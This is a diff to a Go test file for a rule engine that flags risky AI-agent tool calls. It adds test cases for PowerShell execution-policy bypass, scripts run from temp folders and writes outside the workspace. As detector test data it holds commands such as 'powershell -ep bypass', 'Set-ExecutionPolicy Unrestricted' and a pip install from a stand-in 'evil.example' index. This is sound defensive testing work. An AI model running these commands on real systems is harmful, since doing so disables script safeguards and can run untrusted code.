@@ -18,8 +18,8 @@ func TestPatternsCompile(t *testing.T) {
 }
 
 func TestCatalogCoversRules(t *testing.T) {
-	if len(Catalog) != 15 {
-		t.Fatalf("catalog has %d rules, want 15", len(Catalog))
+	if len(Catalog) != 16 {
+		t.Fatalf("catalog has %d rules, want 16", len(Catalog))
 	}
 	seen := map[string]bool{}
 	for _, r := range Catalog {
@@ -32,6 +32,15 @@ func TestCatalogCoversRules(t *testing.T) {
 
 var linuxCtx = Context{Workspace: "/home/u/proj", Home: "/home/u", DataDir: "/home/u/.local/share/afr"}
 var winCtx = Context{Workspace: `C:\Users\U\proj`, Home: `C:\Users\U`, DataDir: `C:\Users\U\AppData\Local\afr`}
+
+// winDesktop is a desktop app session: a scratch workspace, a scratchpad
+// under the user's temp folder, and a folder the app moved it to.
+var winDesktop = Context{
+	Workspace: `C:\Users\U\AppData\Roaming\Claude\scratch-workspaces\a\b\scratch-1`, Home: `C:\Users\U`,
+	DataDir:    `C:\Users\U\AppData\Local\afr`,
+	TempDirs:   []string{`C:\Users\U\AppData\Local\Temp`},
+	Workspaces: []string{`C:\Users\U\Documents\afr-d5`, `C:\Users\U\AppData\Local\Temp\claude\scratch-1\s1\scratchpad`},
+}
 
 func call(tool string, fields map[string]any) schema.Event {
 	b, _ := json.Marshal(fields)
@@ -175,6 +184,23 @@ func TestRules(t *testing.T) {
 		{"npm shorthand", bash("npm i someuser/somerepo"), linuxCtx, map[string]string{InstallFromURL: Medium}},
 		{"pip index", bash("pip install -i https://pypi.evil.example/simple requests"), linuxCtx, map[string]string{InstallFromURL: Medium}},
 		{"pip plain", bash("pip install requests==2.32.0"), linuxCtx, nil},
+
+		// 6 with desktop folders and PowerShell variables.
+		{"ps join-path temp write", ps(`$p = Join-Path $env:TEMP 'd3.txt'; Set-Content -Path $p -Value 'x'`), winDesktop, map[string]string{WriteOutside: Low}},
+		{"ps variable write outside", ps(`$d = 'C:\Users\U\Desktop\x'; New-Item -ItemType Directory -Path $d`), winDesktop, map[string]string{WriteOutside: Medium}},
+		{"write in moved folder", call("Write", map[string]any{"file_path": `C:\Users\U\Documents\afr-d5\plan2.txt`}), winDesktop, nil},
+		{"write in scratchpad", call("Write", map[string]any{"file_path": `C:\Users\U\AppData\Local\Temp\claude\scratch-1\s1\scratchpad\count.ps1`}), winDesktop, nil},
+
+		// 16: scripts with the execution policy bypassed or run from temp.
+		{"bypass scratchpad script", ps(`& powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\U\AppData\Local\Temp\claude\scratch-1\s1\scratchpad\count.ps1"`), winDesktop, map[string]string{ScriptBypass: Medium}},
+		{"ep bypass", ps(`powershell -ep bypass -c "Get-Date"`), winCtx, map[string]string{ScriptBypass: Medium}},
+		{"set policy unrestricted", ps(`Set-ExecutionPolicy Unrestricted -Scope CurrentUser`), winCtx, map[string]string{ScriptBypass: Medium}},
+		{"temp ps1", ps(`& "C:\Users\U\AppData\Local\Temp\run.ps1"`), winDesktop, map[string]string{ScriptBypass: Medium}},
+		{"temp sh", bash("bash /tmp/install.sh --yes"), linuxCtx, map[string]string{ScriptBypass: Medium}},
+		{"temp py", bash("python3 /tmp/x.py"), linuxCtx, map[string]string{ScriptBypass: Medium}},
+		{"workspace script", bash("bash ./scripts/build.sh && python3 tools/gen.py"), linuxCtx, nil},
+		{"get policy", ps(`Get-ExecutionPolicy -List`), winCtx, nil},
+		{"word bypass", bash("echo bypass the cache"), linuxCtx, nil},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -306,5 +332,40 @@ func TestMaskSecrets(t *testing.T) {
 	want := "token ghp_...6789 and AKIA...MPLE [private key] ok"
 	if got != want {
 		t.Errorf("MaskSecrets = %q, want %q", got, want)
+	}
+}
+
+// Details show a path as the agent wrote it, not lowercased.
+func TestDetailKeepsPathCase(t *testing.T) {
+	ctx := winCtx
+	e := call("Write", map[string]any{"file_path": `C:\Users\U\Documents\Plan.TXT`})
+	hs, err := Evaluate(e, &ctx)
+	if err != nil || len(hs) != 1 || hs[0].Detail != `C:\Users\U\Documents\Plan.TXT` {
+		t.Errorf("highlights %v, %v", hs, err)
+	}
+}
+
+// The workspace follows a successful desktop move, never a failed one.
+func TestWorkspaceFollowsMoves(t *testing.T) {
+	var w Workspace
+	move := func(id, path string) schema.Event {
+		b, _ := json.Marshal(map[string]string{"path": path})
+		return schema.Event{EventType: schema.ToolCall, Tool: moveTool, ToolCallID: id, Content: &schema.Content{Input: b}}
+	}
+	res := func(id string, failed bool) schema.Event {
+		return schema.Event{EventType: schema.ToolResult, Tool: moveTool, ToolCallID: id, ToolError: failed}
+	}
+	for _, e := range []schema.Event{
+		{EventType: schema.SessionStart, Cwd: `C:\scratch`, ScratchpadDir: `C:\tmp\pad`},
+		move("m1", `C:\Docs\ok`), res("m1", false),
+		move("m2", `C:\Docs\no`), res("m2", true),
+		{EventType: schema.PromptSubmit, Cwd: `C:\Docs\ok`},
+	} {
+		w.Observe(e)
+	}
+	var c Context
+	w.Apply(&c)
+	if c.Workspace != `C:\scratch` || len(c.Workspaces) != 2 || c.Workspaces[0] != `C:\Docs\ok` || c.Workspaces[1] != `C:\tmp\pad` || len(w.Pending) != 0 {
+		t.Errorf("context %+v, pending %v", c, w.Pending)
 	}
 }
